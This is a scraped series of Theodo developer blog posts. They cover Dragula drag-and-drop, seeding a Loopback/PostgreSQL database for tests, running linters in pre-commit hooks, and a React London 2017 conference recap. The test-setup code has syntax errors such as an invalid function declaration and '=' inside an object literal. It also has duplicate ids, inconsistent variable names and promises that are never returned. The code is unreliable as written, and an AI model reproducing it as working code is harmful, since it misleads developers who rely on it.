reactDragula([container]);\r\n}\r\n\nAnd there you go! You can now reorder the letters with drag & drop. You will also notice the very cool shadow image that indicates where the dragged element would be dropped. Dragula\u2019s tagline is \u201cDrag and Drop so simple it hurts\u201d.\nHTML5 vs Dragula\n\nThe one major drawback of the HTML5 DragEvent is that it is not compatible with touch devices. If you need to implement features for smartphones or tablets, have a look at the touchstart, touchmove and touchend events. They work pretty similarly!\nAs for Dragula, I definitely recommend it for DOM reordering features. It\u2019s super-easy to use and once you know that glitches may occur with the margin and display: flex properties, everything should be okay.\nYou now have the tools to start coding pretty cool features with drag & drop! To go further you can check out the HTML Drag and Drop API, the Touch Events API and the Dragula options.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Louis Le Portz\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHere is what I learnt while testing backend calls to the database on a project using node.js with Loopback and a PostgreSQL database though this article would apply to any technology.\nBasically, it all goes back to saying that each test should have full power over its data. Each test must ensure its independence by cleaning the database first and then defining its own dataset according to its needs.\nAll tests should start by cleaning the database\nWhen testing a function that reads or writes in the database, it is crucial that you know exactly what data it contains. This means that you should setup the dataset yourself and not rely on any previous data it may contain. This also means you need to clean the database before putting any test data in the database.\nIn our project, we used to clean the data at the end of each test thinking this was a good way to make our tests independent. However, making the assumption of a clean database is nothing else but making all tests dependent. This is actually a bad practice because a test could break because another test changed.\nAs a matter of fact, we forgot to clean the database after a few tests. As a consequence, other tests that were executed afterwards were failing randomly depending on the order of execution. We would relaunch all tests until they all passed\u2026 Then we moved the cleaning of the database at the beginning of the tests so that each test was responsible for its independence. The result of each test became consistent as they would pass or fail always in the same way across executions.\nYes some tests did fail after that. This highlighted the fact that they were poorly written, which leads me to my second point.\nAll tests should define their own test data\nAt the risk of repeating myself, it should be clear what data you have in your database at the beginning of a test. Otherwise, your tests will not be easily maintainable.\nIn our project, we used to update a common set of data and load it for each test.\nWe soon faced two problems:\n\nBy adding, removing, or updating data, we would break other tests or worse make them useless without breaking. For instance, take a function that filters an array of objects depending on some condition. Your test array has two entries: one that will be kept, one that will be removed. If you remove the entry that should have been removed, the test still passes, but becomes useless.\nWhen updating a function, we had to retro-engineer the dataset to find the new result of the test. Indeed, the common dataset was not made to give us useful data. It contained more useless data than useful data.\n\nWhen it became impossible to update this common dataset, we decided to define an entire new set of data for each new test. This takes time and requires more lines of code, but eventually made us more efficient. We were able to write more tests in the same amount of time and thus write tests for more cases.\nIds of test data should be hard-coded\nYou want to make your data as easy to use as possible. Fetching data by id will simplify your tests and make them more readable.\nWe were not doing this on our project because alls ids were auto-incremented by the database. Consider for instance two persons whose names are \u2018Person A\u2019 and \u2018Person B\u2019. We want to check that Person A gave 100\u20ac to Person B. If we don\u2019t know the ids for personA, personB, bankAccountA and bankAccountB, here is what the test could look like using Loopback.\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  var accountAId, accountBId;\r\n  cleanDatabase()\r\n  .then(function() {\r\n    return Promise.all([\r\n      Person.create({name: 'Person A'}),\r\n      Person.create({name: 'Person B'})\r\n    ]);\r\n  })\r\n  .then(function(createdPersons) {\r\n    var personAId = createdPersons[0].id;\r\n    var personBId = createdPersons[1].id;\r\n    return Promise.all([\r\n      BankAccount.create({personId: personAId, amount: 100}),\r\n      BankAccount.create({personId: personBId, amount: 0})\r\n    ]);\r\n  })\r\n  .then(function(createdAccounts) {\r\n    accountAId = createdAccounts[0].id;\r\n    accountBId = createdAccounts[1].id;\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(accountAId),\r\n      BankAccount.findById(accountBId)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nNow, if you hard-code ids, here is what this test might look like:\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  cleanDatabase()\r\n  .then(function() {\r\n    return Promise.all([\r\n      Person.create({id: 1, name: 'Person A'}),\r\n      Person.create({id: 2, name: 'Person B'})\r\n    ]);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.create({id: 1, personId: 1, amount: 100}),\r\n      BankAccount.create({id: 2, personId: 2, amount: 0})\r\n    ]);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nWhat we would love to write is actually this:\n// In transfer.test.js\r\nit('should transfer 100 euros', function(done) {\r\n  // Setup data\r\n  var data = {\r\n    Person: [\r\n      {id: 1, name: 'Person A'},\r\n      {id: 2, name: 'Person B'}\r\n    ],\r\n    BankAccount: [\r\n      {id: 1, personId: 1, amount: 100},\r\n      {id: 2, personId: 2, amount: 0}\r\n    ]\r\n  };\r\n  cleanDatabase()\r\n  .then(function() {\r\n    feedDatabase(data);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\nThe feedDatabase function needs to fill table Person before table BankAccount in order to avoid a foreign key constraint violation error on table BankAccount for constraint personId. We write this feedDatabase function in a module that will be common to all tests.\n// In common/test_setup.js\r\nconst FEED_ORDER = [\r\n  ['Person'],\r\n  ['BankAccount']\r\n];\r\n\r\nvar feedDatabaseInOrder = function(index, app, data) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data);\r\n  });\r\n};\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data);\r\n};\r\n\nNote that feedDatabase needs to be given app which is the application instance.\nImprovement 1: using a data initializer\nLet\u2019s improve our example above. Each bank account needs to belong to a bank.\nTo satisfy this constraint, our data in the test needs to look like:\nvar data = {\r\n  Bank: [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'},\r\n    {id: 2, name: 'Person B'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 100},\r\n    {id: 1, personId: 2, bankId: 1, amount: 0}\r\n  ]\r\n};\r\n\nWe also need to add the Bank model to FEED_ORDER in the common module:\n// In common/test.setup.js\r\nconst FEED_ORDER = [\r\n  ['Person', 'Bank'],\r\n  ['BankAccount']\r\n];\r\n\nHowever, the bank to which the bank accounts belong has no impact on our transfer function. We would like to keep in the test only what is meaningful.\nIn another common file, let\u2019s define a data initializer. It should contain no business data but a default value for each model with id 1 by convention. The initializer is not meant to be used as test data. Its aim is only to help satisfy foreign key constraints.\n// In common/data_initializer.js\r\n\r\nconst DATA_INITIALIZER = {\r\n  Bank = [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 1}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'}\r\n  ]\r\n};\r\n\r\nvar getDefaultData = function() {\r\n  // This clones DATA_INITIALIZER so that it cannot be altered\r\n  return JSON.parse(JSON.stringify(DATA_INITIALIZER));\r\n};\r\n\nIn our test, we can now write:\nvar data = getDefaultData()\r\ndata.BankAccount = [\r\n  {id: 1, personId: 1, bankId: 1, amount: 100},\r\n  {id: 1, personId: 2, bankId: 1, amount: 0}\r\n];\r\ndata.Person = [\r\n  {id: 1, name: 'Person A'},\r\n  {id: 2, name: 'Person B'}\r\n];\r\n\nIt\u2019s important that you override BankAccount and Person to be able to see all useful data within the test itself and not be dependent on default values such as the default bank account amount.\nImprovement 2: resetting id sequences\nWhen hard-coding ids as we did, any further attempt to insert a new entry in the database without hard-coding its id will fail. Indeed, while we inserted data with hard-coded ids, the id sequences were never updated. The database will automatically try to insert the new entry with id 1, which is already used.\nThe best way to deal with this problem is to reset the id sequence manually. The most transparent is probably to restart the id sequence at the max id of all inserted rows.\n// In common/test_setup.js\r\n\r\nvar updateIdSequences = function(app) {\r\n  var datasourceConnector, table, tables, updates;\r\n  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;\r\n  updates = [];\r\n\r\n  for (tables of FEED_ORDER) {\r\n    for (table of tables) {\r\n\r\n      var tableName = table.toLowerCase();\r\n      var sequence = tableName + '_id_seq';\r\n\r\n      updates.push(new Promise(function(resolve, reject) {\r\n        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';\r\n\r\n        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));\r\n      }));\r\n    }\r\n  }\r\n  return Promise.all(updates);\r\n};\r\n\r\nfunction getCallback = (sequence, dataSourceConnector, reject, resolve) {\r\n  return function (err1, res) {\r\n    if (err1) { return reject(err1); }\r\n\r\n    if (res[0].max != null) {\r\n      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';\r\n\r\n      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {\r\n        if (err2) { return reject(err2); }\r\n        resolve();\r\n      });\r\n    } else {\r\n      resolve();\r\n    }\r\n  };\r\n}\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data)\r\n  .then(function() {\r\n    // ------------> update all id sequences\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\nImprovement 3: debugging the feedDatabase function\nWhen using the feedDatabase function, I once had trouble understanding a bug in one of my tests. I had forgotten to add the new model I had just created to the FEED_ORDER constant. I made a small change to feedDatabase in order to count the number of inserted models. The function now returns an explicit error when one model of data has not been used.\n// In common/test_setup.js\r\nvar feedDatabaseInOrder = function(index, app, data, countInsertedModels) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n\r\n      // ------------> increment model count\r\n      countInsertedModels++;\r\n\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);\r\n  });\r\n};\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data, 0)\r\n  .then(function(countInsertedModels) {\r\n    // ------------> throw error if counts don't match\r\n    if(countInsertedModels != Object.keys(data).length) {\r\n      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');\r\n    }\r\n  })\r\n  .then(function() {\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\nWhat we get in the end\n\ncommon/test_setup.js\n\nconst FEED_ORDER = [\r\n  ['Person', 'Bank'],\r\n  ['BankAccount']\r\n];\r\n\r\nvar feedDatabaseInOrder = function(index, app, data, countInsertedModels) {\r\n  var line, modelInsertions, modelName;\r\n  if (index === FEED_ORDER.length) {\r\n    return;\r\n  }\r\n  modelInsertions = [];\r\n  for (modelName of FEED_ORDER[index]) {\r\n    if (data.hasOwnProperty(modelName)) {\r\n      countInsertedModels++;\r\n\r\n      for (line of data[modelName]) {\r\n        modelInsertions.push(app.models[modelName].create(line));\r\n      }\r\n    }\r\n  }\r\n  Promise.all(modelInsertions).then(function() {\r\n    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);\r\n  });\r\n};\r\n\r\nvar updateIdSequences = function(app) {\r\n  var datasourceConnector, table, tables, updates;\r\n  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;\r\n  updates = [];\r\n\r\n  for (tables of FEED_ORDER) {\r\n    for (table of tables) {\r\n\r\n      var tableName = table.toLowerCase();\r\n      var sequence = tableName + '_id_seq';\r\n\r\n      updates.push(new Promise(function(resolve, reject) {\r\n        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';\r\n\r\n        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));\r\n      }));\r\n    }\r\n  }\r\n  return Promise.all(updates);\r\n};\r\n\r\nfunction getCallback = (sequence, dataSourceConnector, reject, resolve) {\r\n  return function (err1, res) {\r\n    if (err1) { return reject(err1); }\r\n\r\n    if (res[0].max != null) {\r\n      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';\r\n\r\n      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {\r\n        if (err2) { return reject(err2); }\r\n        resolve();\r\n      });\r\n    } else {\r\n      resolve();\r\n    }\r\n  };\r\n}\r\n\r\nvar feedDatabase = function(app, data) {\r\n  return feedDatabaseInOrder(0, app, data, 0)\r\n  .then(function(countInsertedModels) {\r\n    if(countInsertedModels != Object.keys(data).length) {\r\n      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');\r\n    }\r\n  })\r\n  .then(function() {\r\n    updateIdSequences(app);\r\n  });\r\n};\r\n\n\ncommon/data_initializer.js\n\nconst DATA_INITIALIZER = {\r\n  Bank = [\r\n    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}\r\n  ],\r\n  BankAccount: [\r\n    {id: 1, personId: 1, bankId: 1, amount: 1}\r\n  ],\r\n  Person: [\r\n    {id: 1, name: 'Person A'}\r\n  ]\r\n};\r\n\r\nvar getDefaultData = function() {\r\n  // This clones DATA_INITIALIZER so that it cannot be altered\r\n  return JSON.parse(JSON.stringify(DATA_INITIALIZER));\r\n};\r\n\n\ntransfer.test.js\n\nit('should transfer 100 euros', function(done) {\r\n  // Setup data\r\n  var data = getDefaultData()\r\n  data.BankAccount = [\r\n    {id: 1, personId: 1, bankId: 1, amount: 100},\r\n    {id: 1, personId: 2, bankId: 1, amount: 0}\r\n  ];\r\n  data.Person = [\r\n    {id: 1, name: 'Person A'},\r\n    {id: 2, name: 'Person B'}\r\n  ];\r\n\r\n  cleanDatabase()\r\n  .then(function() {\r\n    feedDatabase(app, data);\r\n  })\r\n  .then(function() {\r\n    return transfer('Person A', 'Person B', 100);\r\n  })\r\n  .then(function() {\r\n    return Promise.all([\r\n      BankAccount.findById(1),\r\n      BankAccount.findById(2)\r\n    ]);\r\n  })\r\n  .then(function(fetchedAccounts) {\r\n    expect(fetchedAccounts[0].amount).toEqual(0);\r\n    expect(fetchedAccounts[1].amount).toEqual(100);\r\n    return done();\r\n  })\r\n  .catch(done);\r\n});\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGireg de Kerdanet\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAre you tired of always writing the same comments on others pull requests?\u00a0Are you tired of always reading the same comments on your pull requests? Stop wasting time, here\u2019s the solution.\nStep One: Install linters on your project\nFor your php files\nInspired by this\u00a0CodeSniffer and PhpStorm Code Inspection article, we can install phpcs with a specific coding standard directly on your project.\nInstall CodeSniffer\ncomposer require --dev squizlabs/php_codesniffer\r\n\nInstall a coding standard\nWhen I start working\u00a0on a Symfony2 project, it was with the djoos/Symfony2-coding-standard repository.\ncomposer require --dev escapestudios/symfony2-coding-standard\r\n\nNow i made my own my fork\u00a0with more rules, try it!\ncomposer require --dev vincentlanglet/symfony3-custom-coding-standard\nUse it\nLet\u2019s try with this file\n// yourfile.php\r\n\r\n<?php\r\n\r\nclass Entity {\r\n    function getVariable() {\r\n        return $this->variable;\r\n    }\r\n\r\n    function setVariable($newValue) {\r\n        $this->variable = $newValue;\r\n    }\r\n\r\n    private $variable;\r\n}\r\n\nThe following command\nvendor/bin/phpcs --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom yourfile.php\r\n\nwill return error messages\n\nthat you can easily correct\n<?php\r\n\r\nnamespace AppBundle\\Entity;\r\n\r\n/**\r\n * Class Entity\r\n *\r\n * @package AppBundle\\Entity\r\n */\r\nclass Entity\r\n{\r\n    /**\r\n     * @var string\r\n     */\r\n    private $variable;\r\n\r\n    /**\r\n     * @return string\r\n     */\r\n    public function getVariable()\r\n    {\r\n        return $this->variable;\r\n    }\r\n\r\n    /**\r\n     * @param string $newValue\r\n     */\r\n    public function setVariable($newValue)\r\n    {\r\n        $this->variable = $newValue;\r\n    }\r\n}\r\n\nNB: If you are tired to write --standard=../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom,\nor if you need to configure phpcs to use it with PhpStorm, try\nvendor/bin/phpcs --config-set default_standard ../../../../vincentlanglet/symfony3-custom-coding-standard/Symfony3Custom\r\n\nYou can find others options here.\nFor your javascript files\nLet\u2019s do the same with eslint.\nInstall eslint\nnpm install eslint --save-dev\r\n\nGenerate a configuration file\nTo start the configuration of eslint, use\n./node_modules/.bin/eslint --init\r\n\nAfter answering a few questions, it will generate a .eslintrc file configured like this\n{\r\n  \"extends\": \"eslint:recommended\",\r\n  \"rules\": {\r\n    \"semi\": [\"error\", \"always\"],\r\n    \"quotes\": [\"error\", \"double\"]\r\n  }\r\n}\r\n\n\nextends apply all the rules of eslint:recommended to your project. I recommend the airbnb config.\nsemi and quotes are extra rules. The first value is the error value of the rule.\n\nUse it\nLet\u2019s try with this file\n// yourfile.js\r\n\r\nvar object={\r\n  'key': 3,\r\n     \"otherKey\" :2\r\n};\r\n\r\nconsole.log(object)\r\n\nThe following command\n./node_modules/.bin/eslint yourfile.js\r\n\nwill return error messages\n\nthat you can easily correct\nconst object = {\r\n  key: 3,\r\n  otherKey: 2,\r\n}\r\n\r\nconsole.log(object)\r\n\nEven for your css files\nIn the same way, you can lint your css files thanks to stylelint.\nInstall stylelint\nnpm install stylelint --save-dev\r\n\nWrite your configuration file\nI recommend the stylelint-config-standard.\nnpm install stylelint-config-standard --save-dev\r\n\nNow you have to create your .stylelintrc file, it works like your .eslintrc file:\n{\r\n  \"extends\": \"stylelint-config-standard\",\r\n  \"rules\": {\r\n    \"string-quotes\": \"single\"\r\n  }\r\n}\r\n\nUse it\nLet\u2019s try with this file\n/* yourfile.css */\r\n\r\n.header {\r\n\r\n}\r\n\r\nbody {\r\ntext-color: red;\r\nmargin-top: 10px;\r\nmargin-bottom: 10px;\r\nmargin: 0;\r\n}\r\n\nThe following command\n./node_modules/.bin/stylelint yourfile.css\r\n\nwill return error messages\n\nthat you can easily correct\nbody {\r\n  color: red;\r\n  margin: 10px 0;\r\n}\r\n\nStep Two: Use linters automatically before each commit\nUse pre-commit hooks\nPre-commit hooks were already introduced in this article, but personally I prefer using a npm package.\nInstall pre-commit\nnpm install pre-commit --save-dev\r\n\nConfigure pre-commit\nYou just need to specify scripts you want to launch before committing in your package.json.\nYou could even launch tests before commits if you wanted.\n{\r\n  \"name\": \"Something\",\r\n  \"version\": \"0.0.0\",\r\n  \"description\": \"Something else\",\r\n  \"main\": \"index.js\",\r\n  \"scripts\": {\r\n    \"lint:php\": \"vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2 *.php\",\r\n    \"lint:js\": \"eslint *.js\",\r\n    \"lint:css\": \"stylelint *.css\"\r\n  },\r\n  \"pre-commit\": [\r\n    \"lint:php\",\r\n    \"lint:js\",\r\n    \"lint:css\"\r\n  ]\r\n}\r\n\nUse it\nJust commit!\nBut don\u2019t worry, you can still force a commit by telling git to skip the pre-commit hooks by simply committing using --no-verify.\nCheck only modified files to be more user-friendly\nRunning a lint process on a whole project is slow and linting results can be irrelevant. Ultimately you only want to lint files that will be committed.\u00a0Lint-staged will be used to run linter on staged files, filtered by a specified glob pattern.\nInstall lint-staged\nnpm install lint-staged --save-dev\r\n\nConfigure lint-staged\nLaunch lint-staged with pre-commit and precise which linter you want to use for specific files pattern in your package.json.\n{\r\n  \"name\": \"Something\",\r\n  \"version\": \"0.0.0\",\r\n  \"description\": \"Something else\",\r\n  \"main\": \"index.js\",\r\n  \"scripts\": {\r\n    \"lint-staged\": \"lint-staged\"\r\n  },\r\n  \"lint-staged\": {\r\n    \"*.php\": \"vendor/bin/phpcs --standard=../../../../escapestudios/symfony2-coding-standard/Symfony2\",\r\n    \"*.js\": \"eslint\",\r\n    \"*.css\": \"stylelint\"\r\n  },\r\n  \"pre-commit\": [\r\n    \"lint-staged\"\r\n  ]\r\n}\r\n\nUse it\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOn a breezy day in March, I, along with three other TheodoUK-ers, attended React London 2017. Standing in the stark light of the Westminster sun that silhouetted the brutalist architecture of the QEII Centre, we admired the conference\u2019s production value \u2013 check out that flag! But would we actually learn anything, or would it just be a day of beautiful typography and tasty canap\u00e9s? We silenced these self-indulgent musings and crossed the threshold into the El Dorado of front-end development.\nReact London 2017 flag, outside the QEII Centre. Photo by me.\nprettier\nYouTube/project\nAfter a light breakfast, we settled in for the first talk: prettier, a JavaScript pretty printer, by Facebook engineer Christopher Chedeau. prettier takes any JavaScript file and returns it perfectly formatted. You may have come up against the limitations of auto-formatting tools such as beautify or eslint. prettier improves on these because it can fix everything, even maximum line length violations (and their inverse, premature multi-line formatting). This is because it first parses the JavaScript into an abstract syntax tree, removing all existing formatting, and then pretty-prints the result (a technique based on a 1983 paper by Philip Wadler). Adding a pre-commit hook that runs prettier completely eliminates the need for all those annoying reformatting requests in code reviews \u2013 so called \u2018nits\u2019. Perhaps one day we will upload just abstract syntax trees to GitHub, then when we want to read them, render them to code using prettier with our own preferred syntax settings. Could this, once and for all, end the debate on semi-colons v. no semi-colons?\nlogux\nYouTube/project\nNext up was Andrey Sitnik, fresh (or perhaps lightly pickled, as he would be the first to admit) in from St Petersburg. He is the creator of logux, a \u201cnew approach to client-server communication\u201d. Inspired by concepts from swarm.js (a \u201cgeneral-purpose isomorphic database that runs simultaneously on the server and client\u201d), logux is essentially the love child of Meteor and Redux. Instead of implementing your own AJAX/REST client-server communications, redux actions are automatically synchronised between the two, thereby keeping their states identical. This eliminates a huge amount of overhead when building apps for the web, meaning more time for vodka \u2026errrr I mean \u2018business logic\u2019. Sounds good to me.\nComplexity curve with AJAX/the world before logux, from Andrey\u2019s slides.\nReason\nYouTube/project\nLadies and gentlemen, hold on to the edge of your seats, we now enter the s t r a n g e world of functional programming.\nReason is a new syntax layer and toolchain for OCaml, a powerful multi-paradigm language derived from ML (functional heaven). Reason is the past (the first version of React was written in SML, aka OCaml\u2019s cousin) and the future, of React. It resembles a typed subset of modern JavaScript, making it easy for frontend developers to jump in and start flexing their functional muscles.\nFunctional muscles. From T nation.\nReason compiles to both JavaScript and native code \u2013 Facebook uses it in production on both the frontend and backend. Cheng Lou, of Facebook, presented a compelling introduction to Reason from first principles. What makes an ideal programming language? What if we can push all the meta language \u2013 modules, files, tests, documentation, package management \u2013 down into the language itself, to make expressing and reasoning about it much easier? A practical example: Reason introduces the concept of modules. These are named, scoped blocks of code that can contain anything that an OCaml/Reason file can. Files and modules map to each other semantically: a file containing multiple modules is equivalent to a folder of files.\n\n/* school.re */\r\n\r\nmodule Teachers = {...};\r\nmodule Rooms = {...};\r\nmodule Students = {\r\n  ...\r\n  module Agendas = {...};\r\n  ...\r\n};\r\n\n\nA Reason file, school.re, containing nested modules, equivalent to a filesystem.\nHaving \u2018first class\u2019 files (modules can be nested, and even passed to and returned from functions) means things like code generation, module typing, module encapsulation and module abstraction can be pushed from the meta level back down into the language itself. If a language can reach a level of maturity where all the boilerplate has been absorbed into the syntax, we could theoretically be left to only write application specific code.\nA shocked boilerplate. From Boilerplate.\nWith lunch (delicious noodles by Leith\u2019s) swiftly approaching, we had a series of 10 minute Lightning Talks, on topics from snapshot testing with Jest to offline-first React and ReactNative development. Then, the Feeding began.\nFeeding Frenzy. From Feeding Frenzy 2, by PopCap.\nstyled-components\nYouTube/project\nHello. Yes, YOU there. Have you ever styled a React Component using CSS? Ever noticed that you are defining single-use classes, in other words there is a one to one mapping between your CSS classes and components? styled-components enforces better practices by removing that mapping. Instead, you style the components themselves.styled-components uses a vanilla ES6 feature, tagged template literals, to drive its syntax. It solves the lack of proper CSS scoping and promotes better designed \u2018style interfaces\u2019 to your components, by encouraging the use of props to change your components\u2019 styles, just as you would do to change their behaviours. This is preferable to manually applying CSS classes (via className), which are actually just implementation detail.\nstyled-components also introduces themes, a workaround for when you do want to apply CSS globally. The main problem with styled components seems to be the lack of standard naming conventions in themes. A standard would allow instant plug and play with third party components, but has not yet been established \u2013 for now, you need to look at the component\u2019s implementation to ensure it correctly observes your theme.\nThe speaker, Max Stoiber, also took the opportunity to debut Polished.js, a \u201clightweight toolset for writing styles in JavaScript\u201d. Think underscore.js, but for styles. Rather than being a CSS framework like Bootstrap, Polished.js provides Sass-style utility functions and mixins, making the switch from a CSS pre-processor to styling in JS super easy.\nReact Fiber\nYouTube/project\nReact is capable of rendering to more environments than just the browser. You have probably heard of ReactNative, but what about ReactVR, ReactBlessed (terminal UIs!) and ReactHardware? A key process in React is reconciliation, the internal \u2018diffing\u2019 algorithm that compares one tree with another to determine which parts need rerendering. React\u2019s ability to render to multiple different environments was made possible by reconciliation and rendering being seperate processes. In fact, internally, React comes in two halves \u2013 the core and the renderers. Each different environment can supply its own renderer, whilst sharing the same core reconciler. React\u2019s current reconciler is called Stack; its upcoming successor, 2 years in the making, is Fiber.\nStack (left) v Fiber (right) performance comparison \u2013 rendering hundreds of components in a Sierpinski triangle. See the live version here.\nThe primary goal with Fiber is speed \u2013 it achieves this by introducing scheduling, the process of determining when work should be performed. Rendering tasks are assigned relative priorities and can then be prioritised, delayed or aborted as required. This gives huge UI performance gains for dynamic UIs and animations. Fiber isn\u2019t ready quite yet, but as it is already promising complete backwards-compatibility, it\u2019s definitely something to look forward to.\nDustan Kasten, the speaker, then did a code walkthrough of a custom renderer he had written using the new Fiber renderer official API.\nWatch this amazing talk (recommended by Dustan), or read this overview, for more.\nPanel\nYouTube\nNext we had the React panel discussion with four Facebook engineers: Ben Alpert, Dan Abramov (creator of Redux, CreateReactApp, ReactHotLoader), Lee Byron and Christopher Chedeau. They addressed the two most important questions for every React developer:\n\nShould you put everything in your redux store, or just app state (i.e. not UI state)? Spoiler: do what makes sense for you and your app.\nWho would win a fight between Mark Zuckerberg & this panel? They said the Zuck \u2013 terrifying.\n\nLet the hacking begin \u2013 the Zuck. From Democratic Underground.\nWeapons grade React\nYouTube\nThe closing talk, Weapons grade React, was by American brogrammer and CEO of Wheeler Defense Systems (disclaimer: this is not a real company), Kenny Wheeler. Despite difficulties with UK customs, Kenny had imported his ReactHardware-powered, car-mounted robot crossbow, named CrossBro. Controlling it with a ReactNative mobile app, he proceeded to perform target practice on his company\u2019s latest hire (ok, it was a Nerf  crossbow).\nA picture says a thousand words, or something. From Kenny Wheeler\u2019s presentation.\nReact London 2017 was an incredible experience. The maturity of frontend engineering, with amazing technologies emerging all the time, shows what an exciting time it is to be a web developer.\nDIY Theodo.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  